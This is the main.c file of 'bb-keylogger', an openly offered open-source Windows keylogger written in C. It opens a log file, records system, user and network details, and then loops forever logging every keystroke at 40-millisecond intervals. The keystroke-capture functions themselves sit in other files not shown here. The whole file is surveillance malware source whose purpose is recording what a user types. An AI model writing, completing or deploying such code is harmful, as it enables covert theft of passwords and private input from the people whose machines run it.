/* This file is part of bb-keylogger project.
*
* See the NOTICE file distributed with this work for copyright information.
*
* Licensed under the Apache License, Version 2.0 (the "License");
* you may not use this file except in compliance with the License.
* You may obtain a copy of the License at
*
* http://www.apache.org/licenses/LICENSE-2.0
*
* Unless required by applicable law or agreed to in writing, software
* distributed under the License is distributed on an "AS IS" BASIS,
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
* See the License for the specific language governing permissions and
* limitations under the License.
*/

/*
* File:   main.c
* Author: Frapin Kevin
* Date:   22/03/2011
*
* DESCRIPTION
* -----------------------------------------------------------------------------
* An open-source keylogger to save all the keystrokes in a log file.
* -----------------------------------------------------------------------------
*/

//---------------------------------------------------------------------- DEFINE
#define _WIN32_WINNT 0x0601

//------------------------------------------------------------- SYSTEM INCLUDES
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <windows.h>
#include <windowsx.h>
#include <winuser.h>

//---------------------------------------------------------- PERSONNAL INCLUDES
#include "includes/bb-keylogger.h"
#include "includes/global.h"

//------------------------------------------------------------------------ MAIN

int main( int argc, char *argv[ ] )
{	
	// Initialize the state of the program
	// initialize_program(  );
	
	char * log_file_name;
	
	if( argc > 1 )
	// If there's a specified log file
	{
		log_file_name = argv[1];
	}
	else
	{
		log_file_name = DEFAULT_LOG_FILE_NAME;
	}
	
	// Open the log file
	FILE * log_file = open_file( log_file_name );
	
	// Log informations about the system
	log_system_infos( log_file );
	
	// Log informations about the logged user
	log_user_infos( log_file );
	
	// Log informations about the network
	log_network_infos( log_file );

	// Log the keystrokes
	log_infos( log_file, "# Keystrokes :\n" );
	for( ; ; )
	{
		Sleep( 40 );
		log_keystrokes( log_file );
	}

}